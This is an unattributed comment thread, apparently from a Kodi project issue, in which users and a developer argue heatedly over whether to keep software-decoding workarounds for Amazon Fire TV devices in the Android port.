just work?  @friend, do you still need to be reminded of  ? ""The main aim for the Android port of Kodi is to foremost target media-players/set-top-boxes/sticks that connect to a large screen television and uses a standard remote control as its main interface device."""" In short ""Amazon FireTV"". From a project manager I would appreciate a less hostile attitude towards users.  No, I will not go and buy a different device. I like Fire TV, because it has a lot of content and apps that I use.  Much more than Nvidia Shield.  For example National Geographic/ Science Channel apps are non existent on Android TV but they are well implemented on Fire TV. Fire TV is just not as great natively for my local content, like backed-up DVD and blu-ray ISO's etc., as it is not designed for that.  But  Kodi accomplishes the task of playing local content very well.  I can buy a separate device for Kodi use, but this would be another box with wires connected to my TV, and this is completely unnecessary, as Fire TV hardware is completely capable of playing all my content well enough for my living room TV.  For advanced Kodi use I have libreelec S905X box in my basement home theater system. Why one would want to restrict capabilities of Kodi is beyond my understanding. This looks like team-Kodi is becoming politcal in its decisions instead of user-oriented.  I am all for clean code, reliability and compatibility, but hiding useful and well implemented options like SW decoding from users is unwise.  The only way to help Android is not to add workarounds for every shitty 40 dollar device someone spits out for the sole goal to sell users their own content. Why do you give amazon money and don't expect from them that they fix their product? On the other hand you argue with volunteers that they add workarounds? 2 for AMLogic 3 for Mediatek 2 for FireTV1 3 for FireTV3 1 for FireTV 4K and so on? Is that really the strategy that you want from an OSS mediacenter like kodi with exactly one Android Developer? Buy a 40 dollar device from amazon and expecting that volunteers fix their shit in the freetime is unwise ...  I don't think I'm the only person that believes Amazon as a company has more devices out there (read a larger base for Kodi installs) than AMLogic.  So maybe not every workaround is a required one, but who drew the line on Amazon devices?  Seems really foolish.  You can have a very clean code, but if a large portion of the user base moves to a competitor that DOES work for their device, what good is that strategy?   it is much cheaper to switch software than to switch hardware.  I myself have 7 fire devices that run Kodi.  Let me ask differently Which workarounds for which device do you find here   is much cheaper to switch software than switch hardware"" &lt;- I believe, that this is cheaper for you - as it's my freetime that is wasted to write the code.  Here, have fun with your 7 devices  If Kodi wants to have pure code, they have to offer their own hardware and only support that (Apple style).  However, by its own description it is made to work on many devices, so ""workarounds"" are part of the deal.  I guess that a totally pure codebase that works on only select devices is what you want.  As a developer myself, I can't help but shake my head at how this thread has gone.  It is a sad day in the life of this project.  If you are a developer then you should step up and start fixing stuff instead of demanding workarounds for bad devices.  It's a sad day for you as developer, demanding workaround stuff from OSS developers while at the same being able to fix the root cause yourself, so that no workarounds would have been needed, this is really sad, especially as your highly wanted workaround is just 10 lines of code ... ",66,90,853,0.228070175,0.368421053,1084,29,y,
